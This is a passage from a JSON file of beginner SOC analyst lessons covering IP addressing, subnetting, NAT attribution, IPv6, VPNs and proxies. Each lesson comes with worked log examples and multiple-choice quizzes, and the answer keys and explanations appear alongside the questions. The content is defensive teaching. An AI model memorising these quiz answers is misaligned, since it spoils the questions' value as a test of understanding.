      "content": "Addresses split into two broad categories that matter enormously for a SOC analyst:\n\n- **Public IP addresses** are globally unique and routable across the internet. Your company's web server and your home router's outside interface have public IPs.\n- **Private IP addresses** are reserved by **RFC 1918** for internal use and are *not* routable on the public internet. They can be reused freely inside any organization.\n\nThe RFC 1918 private ranges are worth memorizing because you will see them thousands of times:\n\n| Range | CIDR | Typical use |\n|---|---|---|\n| 10.0.0.0 - 10.255.255.255 | 10.0.0.0/8 | Large enterprises |\n| 172.16.0.0 - 172.31.255.255 | 172.16.0.0/12 | Medium networks |\n| 192.168.0.0 - 192.168.255.255 | 192.168.0.0/16 | Home and small office |\n\nThere are other special ranges too: `127.0.0.0/8` is **loopback** (the machine talking to itself), and `169.254.0.0/16` is **APIPA/link-local**, which a host self-assigns when it *fails* to get an address from DHCP — a useful anomaly signal.\n\nFor an analyst, the first reflex when you see an IP in a log is to classify it: **is this private or public?** A private source talking to a private destination is internal (east-west) traffic. A private source talking to a public destination is outbound (egress) traffic. A public source hitting your public-facing server is inbound. This single classification tells you the *direction* of a connection before you know anything else, and direction shapes every hypothesis you form."
    },
    {
      "heading": "Subnets and CIDR: Carving the Network, With the Math Worked Out",
      "content": "A **subnet** is a logically divided piece of a larger network. Rather than putting every device on one giant flat network, engineers slice address space into smaller blocks. This is done with a **subnet mask**, most commonly written today in **CIDR notation** (Classless Inter-Domain Routing) — the `/24` you see after an address.\n\nThe number after the slash is how many bits, counting from the left, belong to the **network portion**. The remaining bits identify **hosts** within that network. A `/24` means the first 24 bits are network and the last 8 are host, giving 256 addresses (254 usable, since one is the network address and one is the broadcast).\n\n| CIDR | Mask | Total addresses | Usable hosts |\n|---|---|---|---|\n| /24 | 255.255.255.0 | 256 | 254 |\n| /25 | 255.255.255.128 | 128 | 126 |\n| /16 | 255.255.0.0 | 65,536 | 65,534 |\n\nSo `192.168.1.0/24` covers `192.168.1.0` through `192.168.1.255`, and every host in it shares the first three octets.\n\n### Worked example: is a host inside this subnet?\n\n```\nNetwork: 192.168.1.0/24\nMask:    255.255.255.0 (11111111.11111111.11111111.00000000)\n\nIs 192.168.1.200 inside 192.168.1.0/24?\n- Network bits (first 24) of both must match.\n- 192.168.1.200 -> first 24 bits = 192.168.1 -> matches -> YES, inside.\n\nIs 192.168.2.5 inside 192.168.1.0/24?\n- 192.168.2.5 -> first 24 bits = 192.168.2 -> does NOT match 192.168.1\n- NO, it belongs to a different /24 network.\n```\n\nA smaller mask carves the same range further:\n\n```\n192.168.1.0/26 -> mask 255.255.255.192, 64 addresses (62 usable)\nFour /26 blocks fit inside one /24:\n  192.168.1.0   - 192.168.1.63   (block 1)\n  192.168.1.64  - 192.168.1.127  (block 2)\n  192.168.1.128 - 192.168.1.191  (block 3)\n  192.168.1.192 - 192.168.1.255  (block 4)\n```\n\n**Why this matters for security:** subnets are the backbone of **network segmentation**. Organizations deliberately place the finance servers, the user workstations, the guest Wi-Fi, and the server DMZ on separate subnets so that traffic between them must cross a firewall or router where it can be controlled and logged. A well-segmented network limits **lateral movement** — an attacker who lands on one workstation cannot freely reach the domain controllers if a firewall sits between subnets.\n\nAs an analyst, knowing the subnet map of your environment is a superpower. When you see `10.5.20.14` connecting to `10.5.99.3`, recognizing that `.20.x` is the user VLAN and `.99.x` is the server VLAN instantly tells you a workstation reached a server. If a host in the guest subnet suddenly talks to the internal database subnet, that crossing is exactly the kind of boundary violation that should raise your eyebrows. Segment boundaries are where the interesting alerts live."
    },
    {
      "heading": "NAT and the Translation Problem",
      "content": "**NAT (Network Address Translation)** solves a practical problem: there are billions of private hosts but a limited pool of public IPv4 addresses. NAT lets an entire organization full of private-addressed machines share one (or a few) public IPs when reaching the internet. The most common form is **PAT (Port Address Translation)**, also called **NAT overload**, where many internal hosts are multiplexed behind a single public IP by assigning each connection a unique source port.\n\nHere is the mechanism. Workstation `192.168.1.20` opens a connection to a website. As the packet leaves through the firewall, NAT rewrites the source from `192.168.1.20:51000` to `203.0.113.10:40001` (the public IP plus a translated port). The firewall records this mapping in its **translation table**. When the reply comes back to `203.0.113.10:40001`, the firewall looks up the table and rewrites the destination back to `192.168.1.20:51000`, delivering it to the right internal host.\n\n### The translation table, worked\n\n```\nNAT / xlate translation table (simplified):\n\nInternal (src)          Translated (xlate)         Time\n192.168.1.20:51000  ->  203.0.113.10:40001     14:32:05\n192.168.1.41:53211  ->  203.0.113.10:40002     14:32:06\n192.168.1.20:51500  ->  203.0.113.10:40003     14:32:19\n```\n\nNotice the same internal host (`192.168.1.20`) can appear twice with different translated ports for two different sessions, and two entirely different internal hosts share the exact same public IP, distinguished only by port and time.\n\n**This is the single most important NAT fact for a SOC analyst — the *xlate* problem.** Anyone observing traffic on the internet sees only the public IP `203.0.113.10`. If a threat-intel report says 'we saw malicious activity from your IP 203.0.113.10 at 14:32:07', that public IP maps to *thousands* of internal machines over time. To answer 'which of my machines did this?' you must correlate the external observation against the **NAT/xlate logs** that recorded the internal-to-public mapping for that exact timestamp and source port.\n\nCheck Point logs expose this directly with fields like `xlatesrc` and `xlatedst` (the translated addresses) alongside `src` and `dst` (the originals). Without matching on **both the port and the precise time**, you cannot attribute the activity — the port is often the only thing that distinguishes one internal host's session from another's behind the same public IP. This is why time synchronization (NTP) across your logging infrastructure is not a nicety but a prerequisite for accurate attribution. A one-minute clock skew can point you at the wrong workstation."
    },
    {
      "heading": "IPv6: When the World Ran Out of Addresses",
      "content": "### Why IPv6 exists\n\nWith roughly 4.3 billion IPv4 addresses and many more billions of devices online today (phones, IoT sensors, cars), the IPv4 address space has effectively run out — the pool of available public IPv4 addresses has been exhausted for years, which is part of why NAT became so essential in the first place. **IPv6** is the replacement designed with room to spare: a **128-bit** address instead of 32-bit, giving approximately 340 undecillion (3.4x10^38) possible addresses — enough for every grain of sand on Earth to have its own address many times over.\n\n### What an IPv6 address looks like\n\nIPv6 addresses are written as eight groups of four hexadecimal digits, separated by colons:\n\n```\nFull form:\n2001:0db8:85a3:0000:0000:8a2e:0370:7334\n\nShortened (leading zeros in each group dropped,\none run of all-zero groups collapsed to ::):\n2001:db8:85a3::8a2e:370:7334\n```\n\nThe `::` can only be used **once** in an address (otherwise it would be ambiguous how many zero-groups it replaces).\n\n### What changes for an analyst\n\nBecause there are enough public IPv6 addresses for every device, **NAT is far less necessary** in IPv6 — many organizations give devices real, routable IPv6 addresses directly, which changes the attribution problem from the previous section (no shared public IP to disentangle, but now you must track a device's IPv6 address directly). Hosts commonly hold **multiple IPv6 addresses at once**: a **link-local** address (`fe80::/10`, used only on the local segment, never routed) alongside one or more **global** addresses. Many networks run **dual-stack** — both IPv4 and IPv6 active — so the very same physical machine can show up under two completely different addresses in different logs, an easy way to miss a correlation if you forget to check both. For an attacker, scanning an entire IPv6 subnet by brute force is essentially impossible (the address space per subnet is already 2^64), so IPv6 environments favor different reconnaissance techniques rather than blind address sweeps."
    },
    {
      "heading": "Reading a Firewall Log Line, Field by Field",
      "content": "A typical allowed connection log line gives you a **source IP (`src`)**, **destination IP (`dst`)**, **source and destination ports**, **protocol**, **action** (accept/drop), and often the **translated addresses** and the **rule** that matched.\n\n### A real log line, decoded\n\n```\n2026-08-16 14:32:05 src=192.168.1.20 spt=51000 dst=93.184.216.34 dpt=443\nproto=TCP action=Accept xlatesrc=203.0.113.10 xlatespt=40001 rule=17\n```\n\nRead it left to right: at 14:32:05, internal host `192.168.1.20` (private, RFC 1918) opened a connection from source port 51000 to `93.184.216.34` (public) on port 443 (HTTPS). The firewall **accepted** it under rule 17, and NAT translated the source to the public `203.0.113.10:40001`. Classifying it: private-to-public, so this is normal **egress** web browsing — unless the destination reputation, the time of day, or the volume of data says otherwise.\n\nReading it as an analyst:\n\n- **Classify the addresses.** Private-to-public means egress; a private internal host is reaching out. Public-to-private means inbound; the internet is reaching your host.\n- **Check the direction against expectation.** A database server on the internal subnet making an *outbound* connection to a public IP is unusual — servers usually receive connections, not initiate them to the internet. That inversion is a classic beaconing/exfiltration tell.\n- **Watch segment crossings.** A source and destination in different internal subnets means traffic crossed a boundary; ask whether that crossing is policy-approved.\n- **Use xlate fields for attribution.** When correlating with an external report, map the public IP and translated port back to the real internal `src`.\n\nThe skill you are building is turning a row of addresses and ports into a sentence: 'internal workstation X reached out to public host Y on port Z at time T, and that is (or is not) normal.' Everything downstream — pivoting, scoping, escalating — depends on getting that sentence right, and NAT is the twist that most often trips analysts up."
    },
    {
      "heading": "How Attackers Abuse Addressing, Subnets, and NAT",
      "content": "### Reconnaissance: mapping the network by its addresses\n\nOnce an attacker has any foothold, one of their first moves is **network discovery** — working out what subnets exist and what lives on them. This maps to MITRE ATT&CK technique **T1046 (Network Service Discovery)** and **T1018 (Remote System Discovery)**: the attacker sends probes across ranges of IP addresses (a **ping sweep** or **port scan**) to learn which hosts are alive and what services they run. Because subnets group related hosts together, a scan of `10.5.20.0/24` quickly tells an attacker 'this is the workstation VLAN', while a scan of `10.5.99.0/24` might reveal servers. In logs, this shows up as one internal source touching **many destination IPs** or **many ports** on the same destination in a short window — a shape totally different from normal user traffic, which talks to a small, repetitive set of destinations.\n\n### IP spoofing\n\n**IP spoofing** is forging the source address in a packet so it appears to come from somewhere else — used in denial-of-service attacks (to hide the real attacker and to make it look like traffic is coming from a victim, called reflection) and in some evasion techniques. Because spoofed packets rarely complete a real handshake, spoofing is more often seen in the flood/DoS category than in ordinary sessions.\n\n### Abusing NAT and proxies for anonymity\n\nAttackers deliberately route their own traffic through **NAT gateways, VPNs, and proxy chains** (MITRE **T1090, Proxy**) so that the source address your logs see is not their real one. This is exactly why the NAT attribution problem in this lesson runs in both directions: defenders use NAT logs to find their own compromised host behind a shared address, and attackers exploit the same shared-address effect to make their outbound traffic to a C2 server blend in with everyone else's, or to hide their real origin when connecting inbound.\n\n### Segment-hopping as a red flag\n\nBecause subnets and firewalls between them are how organizations enforce **network segmentation**, any traffic that crosses from a low-trust subnet (guest Wi-Fi, a user VLAN) into a high-trust subnet (the server or database VLAN) *outside* of the narrow, expected pattern is one of the highest-value alerts a segmented network can produce — it usually means either a misconfiguration or **lateral movement** in progress. The questions to always ask when an IP shows up in an alert: *is this address private or public? Which subnet is it in, and should that subnet ever talk to the destination subnet? Is this address translated (NAT), and if so, what real internal host or real external user is actually behind it?* Answering those three questions, using exactly the concepts from this lesson, is the first move in almost every network-based investigation you will ever do."
    }
  ],
  "keyTakeaways": [
    "An IPv4 address is a 32-bit number written as four dotted-decimal octets (0-255 each); classify every address as private (RFC 1918: 10/8, 172.16/12, 192.168/16) or public first — that single step reveals whether a connection is inbound, outbound, or internal.",
    "CIDR notation (/24, /26, etc.) marks where the network bits end and host bits begin; subnetting is the technical basis for network segmentation, and traffic crossing between low-trust and high-trust subnets is one of the highest-value signals a SOC analyst can watch.",
    "NAT/PAT lets many internal hosts share one public IP by assigning each session a unique port; attributing external activity to a real machine always requires correlating the public IP plus translated port against xlate logs at the exact timestamp.",
    "IPv6's 128-bit addresses make NAT far less necessary and scanning a whole subnet impractical, but dual-stack environments mean the same host can appear under two different addresses across your logs.",
    "Attackers abuse this layer directly: network/host discovery scans (MITRE T1046/T1018) show up as one source touching many destinations, and adversaries route through NAT/proxies (T1090) to blend their own traffic in — always ask whether an address is private/public, which subnet it belongs to, and what real host or user sits behind any translation."
  ],
  "quiz": [
    {
      "question": "Threat intel reports malicious traffic from your organization's public IP 203.0.113.10 at 14:32:07. Behind that IP, hundreds of workstations use PAT to share it. What must you do to identify the specific internal host responsible?",
      "options": [
        {
          "label": "Block the public IP 203.0.113.10 at the perimeter firewall, since that address is clearly the compromised machine that needs isolating.",
          "value": "a"
        },
        {
          "label": "Correlate the public IP and translated source port against NAT xlate logs at the precise timestamp to map it back to the internal host.",
          "value": "b"
        },
        {
          "label": "Search endpoint logs for any host in the 203.0.113.0 subnet, because the internal machine shares that same network range.",
          "value": "c"
        },
        {
          "label": "Review the DHCP server leases for 203.0.113.10 to find which workstation was assigned that address at the time.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct (b): PAT multiplexes many hosts behind one public IP using unique source ports, so only the public-IP-plus-port mapping recorded in xlate logs at that exact time identifies the real internal machine. (a) is wrong: the public IP is the shared NAT egress address, not a single machine, and blocking it would cut off the whole organization. (c) is wrong: internal hosts use private RFC 1918 addresses, not the public IP's range. (d) is wrong: 203.0.113.10 is a public NAT address, not something handed out by internal DHCP to workstations."
    },
    {
      "question": "In a firewall log you see an internal database server on the 10.5.99.0/24 subnet initiating an outbound connection to a public IP address on a high port. Why should this draw your attention?",
      "options": [
        {
          "label": "Database servers normally receive inbound connections, so an outbound connection to a public internet host inverts the expected traffic direction.",
          "value": "a"
        },
        {
          "label": "The /24 subnet mask only allows 254 hosts, so the server has likely exhausted its available address pool and is malfunctioning.",
          "value": "b"
        },
        {
          "label": "Public IP addresses cannot legally appear in firewall logs alongside private RFC 1918 addresses, indicating the log is corrupted.",
          "value": "c"
        },
        {
          "label": "High port numbers are reserved exclusively for attackers, so any connection using one is automatically confirmed as malicious activity.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Correct (a): servers typically accept connections rather than initiate them to the internet, so an internal database server reaching outbound is a direction inversion that fits beaconing or exfiltration and warrants investigation. (b) is wrong: the /24 host count has nothing to do with a single outbound session. (c) is wrong: private-to-public rows are completely normal in firewall logs and show NAT/egress traffic. (d) is wrong: high (ephemeral) ports are used routinely by legitimate client connections and are not inherently malicious."
    },
    {
      "question": "One internal host generates connection attempts to 200 different destination IP addresses on the same port within two minutes, none typical destinations for that user. What does this pattern most likely represent, and which MITRE ATT&CK technique fits?",
      "options": [
        {
          "label": "Normal DNS resolver caching behavior, mapped to no attack technique since caching answers do not involve outbound connections at all.",
          "value": "a"
        },
        {
          "label": "Network/host discovery scanning across the subnet, mapping to MITRE ATT&CK T1046 (Network Service Discovery).",
          "value": "b"
        },
        {
          "label": "A NAT translation table refresh, mapped to T1090 (Proxy), since NAT periodically reconnects to every recently used address.",
          "value": "c"
        },
        {
          "label": "A scheduled software update check, mapped to T1584 (Compromise Infrastructure), since updates poll many vendor servers directly.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct (b): one source touching hundreds of destinations on the same port in minutes is the classic shape of a port/host discovery scan, mapped to T1046. (a) is wrong: DNS caching does not generate outbound connections to 200 destinations. (c) is wrong: NAT tables track existing sessions, they do not proactively reconnect to old addresses. (d) is wrong: software updates poll a small, fixed set of vendor servers, not 200 unrelated destinations."
    }
  ],
  "references": [
    "https://datatracker.ietf.org/doc/html/rfc1918",
    "https://www.rfc-editor.org/rfc/rfc4632",
    "https://www.cloudflare.com/learning/network-layer/what-is-network-address-translation-nat/",
    "https://attack.mitre.org/techniques/T1046/"
  ],
  "xp": 220,
  "estimatedMinutes": 46,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "networking-lesson-vpn-and-proxy-explained",
  "slug": "vpn-and-proxy-explained",
  "title": "VPN and Proxy Explained",
  "topic": "Networking",
  "difficulty": "beginner",
  "kind": "lesson",
  "intro": "VPNs and proxies both sit in the middle of network conversations and change what you, the analyst, get to see. They are everywhere in modern environments — legitimate remote-access VPNs, corporate web proxies, and, on the other side, the anonymizing infrastructure attackers use to hide where they really are. This lesson assumes no prior knowledge: it starts by defining what it even means for something to sit 'in the middle' of a connection, then explains how each technology works, exactly how they alter source IPs and visibility, how attackers abuse them, and finally walks a full worked example chaining VPN, proxy, and firewall logs together — the exact skill you will use on the job.",
  "sections": [
    {
      "heading": "From Zero: What Does It Mean to 'Sit in the Middle' of a Connection?",
      "content": "### The mail-forwarding analogy\n\nImagine you move house but keep receiving mail at your old address. You arrange for the post office to **forward** every letter to your new address. Anyone sending you mail still writes your old address on the envelope — they have no idea a forwarding step happened, or where you really live now. A **proxy** and a **VPN** both do something like this for network traffic: they sit between two parties and change what the far end can see about the sender.\n\n### Two different jobs, one shared effect\n\nA **VPN (Virtual Private Network)** and a **proxy** are not the same tool, and mixing them up leads to bad investigations. But they share one effect worth naming up front: both can make traffic appear to come from a different IP address than the real originating device, and both can limit what a security sensor watching the middle of the path can see. Where they differ is *what problem each was built to solve*:\n\n| | VPN | Proxy |\n|---|---|---|\n| Primary job | Encrypt an entire tunnel of traffic between two points | Relay and often inspect/filter specific application requests (e.g., web) |\n| Typical scope | All traffic from a device | Usually one protocol (e.g., HTTP/HTTPS) |\n| Common legitimate use | Remote employees reaching the office network securely | Enforcing web policy, load-balancing servers |\n\n### Why 'encryption' matters here\n\n**Encryption** means scrambling data with a mathematical key so that anyone without the key sees only meaningless noise, not the real content. A VPN's defining feature is that it encrypts an entire **tunnel** — imagine a sealed, opaque pipe laid across the open internet; nothing outside the pipe can read what travels inside it, only the two ends holding the right key can. A basic proxy, by contrast, does not necessarily encrypt anything new — it may simply relay a request, though it very often runs over an already-encrypted connection (HTTPS) between the client and itself.\n\nWith that foundation, the next two sections open up exactly how a VPN's tunnel and a proxy's relay each work, step by step."
    },
    {
      "heading": "What a VPN Is and How It Changes the Picture",
      "content": "A **VPN (Virtual Private Network)** creates an **encrypted tunnel** between a client and a VPN server across an untrusted network like the internet. Traffic entering the tunnel is encrypted and encapsulated; only at the far end is it decrypted and forwarded on. Two flavors dominate: **remote-access VPN**, where an individual employee's laptop tunnels into the corporate network from home or a coffee shop, and **site-to-site VPN**, which links two offices' networks permanently.\n\nThe core effect for a SOC analyst is a **change of apparent source and a loss of payload visibility**. Consider a remote employee. Before the VPN, their traffic to an internal application would originate from their home ISP address. Once connected, their traffic emerges from the **VPN concentrator's internal IP** — often an address in a dedicated VPN pool like `10.10.50.0/24`. So when you investigate a connection to an internal server and the source is a VPN-pool address, the real user is somewhere on the internet, and you must pivot to the **VPN authentication logs** to learn who authenticated to that pool address at that time.\n\n### A VPN authentication log line, decoded\n\n```\n2026-08-16 09:02:14 VPN-GW01 event=connect user=d.rosen\nexternal_ip=95.155.20.44 assigned_ip=10.10.50.14\nduration=00:00:00 bytes_in=0 bytes_out=0\n```\n\nRead it as a sentence: at 09:02:14, user `d.rosen` authenticated from their real external IP `95.155.20.44` and was handed the internal pool address `10.10.50.14` for the duration of this session. Any traffic you later see from `10.10.50.14` inside the corporate network belongs, for this window, to `d.rosen` — and to no one else, until they disconnect or a new user is assigned that same pool address.\n\nEncryption is the second effect. Everything inside the tunnel is opaque to any sensor watching the network segment the tunnel crosses. A network IDS positioned between the client and the VPN server sees encrypted blobs, not the HTTP requests inside. This is why VPN traffic shifts your visibility from the network layer to the **endpoints** and the **VPN gateway logs**: the gateway records who connected, from what external IP, at what time, for how long, and how much data moved — metadata that is often your richest source when the content itself is encrypted.\n\nA practical investigative habit: for any VPN-pool source IP, always resolve it to a **named user and a real external origin IP** using the VPN logs before you draw conclusions. Two different employees can hold the same pool address on different days, so — as with NAT — timestamp-accurate correlation is essential."
    },
    {
      "heading": "Forward and Reverse Proxies",
      "content": "A **proxy** is an intermediary that makes requests on behalf of something else. There are two kinds, and confusing them leads to bad analysis, so keep the direction straight.\n\nA **forward proxy** sits between internal users and the internet. When a workstation browses the web, the request goes to the proxy, which fetches the page and returns it. Corporate **web proxies / secure web gateways** work this way to enforce policy (block categories, scan for malware) and to log every URL users visit. The security consequence: from any external website's perspective, *all* your users appear to come from the **proxy's public IP**, similar to NAT. And the security *benefit*: the proxy holds a complete, centralized record of outbound web requests — one of the most valuable log sources you have for hunting command-and-control and data exfiltration.\n\nA **reverse proxy** sits in front of servers and faces the internet. When outside users reach your web application, they actually connect to the reverse proxy, which forwards the request to the real backend server. Products like NGINX, HAProxy, and CDN/WAF services (Cloudflare, Akamai) act as reverse proxies. They provide load balancing, TLS termination, and a chokepoint for a **WAF** to inspect inbound requests. The analyst consequence: your backend server's logs may show the **reverse proxy's IP as the source** of every request unless the proxy inserts the original client IP into an **`X-Forwarded-For`** header.\n\n### X-Forwarded-For, worked\n\n```\nGET /login HTTP/1.1\nHost: app.internal.example.com\nX-Forwarded-For: 88.212.14.9, 10.0.0.5\n```\n\nTwo addresses appear because the request passed through two hops: `88.212.14.9` is the real original client (the internet user), and `10.0.0.5` is an internal relay (e.g., a load balancer) also in the chain. The **first address in the list is the original client**; everything after it is an intermediate hop. If your backend application logs only show `10.0.0.5` as the source, you are looking at the reverse proxy, not the attacker — always check for an `X-Forwarded-For` (or similar `X-Real-IP`) header before concluding who really connected.\n\n| Property | Forward proxy | Reverse proxy |\n|---|---|---|\n| Position | In front of clients | In front of servers |\n| Protects/serves | Internal users | Backend servers |\n| Hides | Client identity from the web | Server details from clients |\n| Key SOC log value | Outbound URL history | Inbound request inspection (WAF) |\n\n**TLS inspection** deserves a note. Both web proxies and reverse proxies can be configured to decrypt TLS (acting as a controlled man-in-the-middle) so their engines can inspect the plaintext. Where TLS inspection is enabled, you regain visibility into URLs and payloads; where it is not, the proxy still logs the destination and metadata but not the encrypted content."
    },
    {
      "heading": "How Attackers Abuse VPNs and Proxies",
      "content": "The same middle-of-the-conversation position that makes VPNs and proxies useful for defenders makes them attractive to attackers, primarily to **hide their true origin and blend in**.\n\n### Hiding origin\n\nAttackers route their traffic through **commercial VPNs, anonymizing proxies, the Tor network, or residential proxy services** so that your logs show a benign-looking source instead of their real location. A login to a corporate account that appears to come from a datacenter VPN provider's IP range, rather than a normal residential ISP, is a common tell. **Residential proxies** are especially nasty because they route attacker traffic through real consumers' compromised devices, making the source look like an ordinary home user.\n\n### C2 through proxies\n\nMalware frequently reaches its **command-and-control (C2)** server through **chains of proxies or compromised intermediary hosts** rather than connecting directly, so the endpoint that a defender can see is a relay, not the true operator. This defeats simple 'block the bad IP' responses and is why analysts pivot on *behavior* (beaconing intervals, unusual destinations) rather than relying on any single IP being malicious.\n\n### Malicious and rogue VPNs\n\nAttackers deploy their own VPN tunnels to create an **encrypted, hard-to-inspect channel** out of a victim network — installing VPN client software on a compromised host so their traffic tunnels past network sensors. A newly installed, unsanctioned VPN client on an endpoint is a serious finding. Some malware even bundles VPN functionality specifically to evade network monitoring.\n\n### Bypassing controls\n\nUsers (and insiders) sometimes run personal VPNs or proxies to **evade the corporate web proxy's policy and logging**, punching a hole in your visibility. From a detection standpoint, an endpoint suddenly bypassing the corporate proxy and talking directly to the internet is both a policy violation and a potential evasion technique.\n\nThe unifying lesson: VPNs and proxies break the naive assumption that a source IP equals an actor. Sophisticated adversaries deliberately exploit that gap, so treat any anonymizing infrastructure in your logs as a reason to dig deeper, not a dead end."
    },
    {
      "heading": "Detection Considerations for the Analyst",
      "content": "You cannot ban all VPNs and proxies — many are legitimate business tools — so detection is about spotting *anomalous* use and preserving your ability to correlate.\n\n### Enrich source IPs with reputation and category data\n\nThreat-intel feeds and services classify IPs as belonging to **hosting/datacenter providers, known VPN/proxy services, Tor exit nodes, or residential ranges**. A user authentication arriving from a Tor exit node or a commercial VPN block, when your workforce normally logs in from residential and mobile ISPs, is a high-value signal. Many SIEMs let you tag events with this enrichment automatically.\n\n### Watch for impossible travel and geo-velocity\n\nIf an account logs in from one country and, twenty minutes later, from another thousands of kilometers away, either two people share the credential or one login came through a VPN/proxy in a different location. This is a foundational identity-based detection and a direct consequence of how VPNs relocate a user's apparent origin.\n\n### Hunt for unsanctioned tunneling on endpoints\n\nLook for **newly installed VPN or proxy software**, connections to known VPN provider infrastructure from hosts that should not have it, and endpoints that stop routing web traffic through the corporate proxy. Endpoint telemetry (EDR) is where you catch a rogue VPN because the network sensor only sees the encrypted tunnel.\n\n### Lean on metadata when content is encrypted\n\nWhen TLS inspection is not in play, you still have destination IPs and domains, connection timing, session duration, and byte counts. **Beaconing** — regular, machine-like connection intervals to the same destination — is detectable in metadata alone and is a classic C2 pattern that surviving encryption cannot hide.\n\n### Always resolve the intermediary to the real actor\n\nThe recurring theme across NAT, VPN, and proxy: an intermediary IP is not the actor. Build the habit of pivoting from the VPN-pool address, proxy IP, or `X-Forwarded-For` value to the underlying user and true origin using authentication logs, proxy logs, and identity systems. An investigation that stops at the intermediary IP is only half done."
    },
    {
      "heading": "Worked Scenario: Tracing a User Through VPN, Proxy, and Firewall Logs",
      "content": "Let's put the whole lesson together with one realistic walk-through. Suppose an alert fires: 'large upload to an external file-sharing site from an internal proxy IP.' Here is what you would actually find, log by log.\n\n```\n1) Proxy log (forward proxy):\n   09:14:02 src=10.10.50.14 user=(unauthenticated at proxy)\n   url=https://upload.example-filehost.com/put dst_bytes=850000000\n\n2) VPN gateway log:\n   09:01:55 event=connect user=d.rosen external_ip=95.155.20.44\n   assigned_ip=10.10.50.14\n\n3) Firewall log (proxy egress):\n   09:14:02 src=203.0.113.10(proxy public IP) dst=external-filehost\n   action=Accept bytes=850000000\n```\n\nReading top to bottom: the proxy shows the internal address `10.10.50.14` uploading 850MB to a file-sharing site — but the proxy itself may not have authenticated the user by name (many forward proxies only log the source IP for certain traffic types). That address alone is not a person. Pivoting to the **VPN gateway log**, you find that `10.10.50.14` was assigned to `d.rosen` starting at 09:01:55 — before the upload — so the pool address is attributable for this window. Finally, the **firewall log** confirms the same byte count leaving through the proxy's public IP, corroborating the size of the transfer.\n\nThree different log sources, three different vantage points, one coherent story: *d.rosen's session uploaded 850MB to an external file-sharing site at 09:14.* Whether that is a policy violation or a legitimate business need is your next question — but you could not even ask it correctly without chaining VPN, proxy, and firewall logs through their shared identifiers (the pool IP and the timestamp). This is the pattern every real investigation in this space follows: never trust a single log alone, always chain the intermediary back to the real actor."
    }
  ],
  "keyTakeaways": [
    "A VPN encrypts an entire tunnel between two points; a proxy relays (and often filters) specific application traffic — both change what a downstream sensor or server can see, but for different reasons and at different scope.",
    "A VPN/proxy IP is an intermediary, not the actor — always pivot from the VPN-pool address, proxy IP, or X-Forwarded-For header to the real user and true origin using authentication and proxy logs.",
    "Forward proxies sit in front of users and centralize outbound URL history; reverse proxies sit in front of servers and can hide the real client IP behind the proxy's own address unless X-Forwarded-For is checked.",
    "Because tunnels encrypt payloads, shift detection to metadata and endpoints: enrich source IPs with VPN/Tor reputation, watch for impossible-travel logins, hunt rogue VPN software in EDR, and detect beaconing in connection timing.",
    "Real investigations chain VPN, proxy, and firewall logs together through shared identifiers (pool IP, timestamp, byte counts) to turn several individually-thin log lines into one coherent, attributable story."
  ],
  "quiz": [
    {
      "question": "An investigation shows a connection to an internal application originating from 10.10.50.14, an address in your remote-access VPN pool. What is the correct next step to identify the actual user?",
      "options": [
        {
          "label": "Treat 10.10.50.14 as the compromised host itself and immediately isolate that machine from the corporate network.",
          "value": "a"
        },
        {
          "label": "Pivot to the VPN gateway authentication logs to find which user held that pool address and their real external IP at that time.",
          "value": "b"
        },
        {
          "label": "Assume the traffic is safe because VPN-pool addresses are internal and internal traffic is inherently trusted by policy.",
          "value": "c"
        },
        {
          "label": "Block the 10.10.50.0/24 pool at the firewall so no further connections from remote users can reach the application.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct (b): the VPN concentrator assigns pool addresses dynamically, so only the gateway's authentication logs tie that address at that timestamp to a named user and their true external origin. (a) is wrong: the pool address is the VPN gateway's assignment, not a distinct physical machine to isolate. (c) is wrong: an internal source address does not make traffic trustworthy, and the real user is out on the internet. (d) is wrong: blocking the whole pool cuts off all legitimate remote users rather than identifying the actor."
    },
    {
      "question": "Your corporate web proxy does not perform TLS inspection, so you cannot see the URLs or payloads inside encrypted sessions from a suspicious host. Which approach can still reveal likely command-and-control activity?",
      "options": [
        {
          "label": "Analyze connection metadata for regular, machine-like beaconing intervals to the same destination, which survives encryption.",
          "value": "a"
        },
        {
          "label": "Decrypt the archived TLS sessions after the fact using the proxy's stored logs, since proxies retain the plaintext by default.",
          "value": "b"
        },
        {
          "label": "Conclude the host is clean, because without payload visibility no command-and-control activity can be identified at all.",
          "value": "c"
        },
        {
          "label": "Rely solely on the source IP reputation of the internal host, since internal addresses reveal C2 intent on their own.",
          "value": "d"
        }
      ],
      "answer": "a",
      "explanation": "Correct (a): beaconing is a timing pattern visible in metadata — destination, interval, and byte counts — so regular machine-like callbacks can be detected even when the payload is encrypted. (b) is wrong: without TLS inspection the proxy never held the plaintext, so there is nothing to decrypt later. (c) is wrong: metadata analysis still enables detection, so encrypted payloads do not make a host automatically clean. (d) is wrong: an internal host's own IP reputation says nothing about C2; the meaningful signal is the outbound destination and timing."
    },
    {
      "question": "A backend web application's logs show every login attempt, including a credential-stuffing wave from thousands of external users, originating from the single IP 10.0.0.5. What is the most likely explanation, and what should you check?",
      "options": [
        {
          "label": "10.0.0.5 is compromised and personally responsible for every login attempt, so it should be isolated immediately as the attacking host.",
          "value": "a"
        },
        {
          "label": "10.0.0.5 is a reverse proxy relaying client requests; check the X-Forwarded-For header for the true original client IP.",
          "value": "b"
        },
        {
          "label": "The application's logging is broken and cannot be trusted, so no further investigation is possible without replacing the logging system.",
          "value": "c"
        },
        {
          "label": "10.0.0.5 is a VPN pool address, so the true users can only be found via the corporate VPN gateway's authentication logs.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct (b): a single internal address fronting thousands of distinct login attempts is the signature of a reverse proxy relaying real clients; the X-Forwarded-For header (or equivalent) carries the original client IP that the proxy would otherwise hide. (a) is wrong: 10.0.0.5 is the proxy's own address, not an attacking host, so isolating it would just break the application. (c) is wrong: this is expected reverse-proxy behavior, not broken logging. (d) is wrong: this scenario describes a reverse proxy in front of a server, not a VPN pool assigned to remote employees."
    }
  ],
  "references": [
    "https://www.cloudflare.com/learning/access-management/what-is-a-vpn/",
    "https://www.cloudflare.com/learning/cdn/glossary/reverse-proxy/",
    "https://attack.mitre.org/techniques/T1090/",
    "https://attack.mitre.org/techniques/T1572/"
  ],
  "xp": 220,
  "estimatedMinutes": 46,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
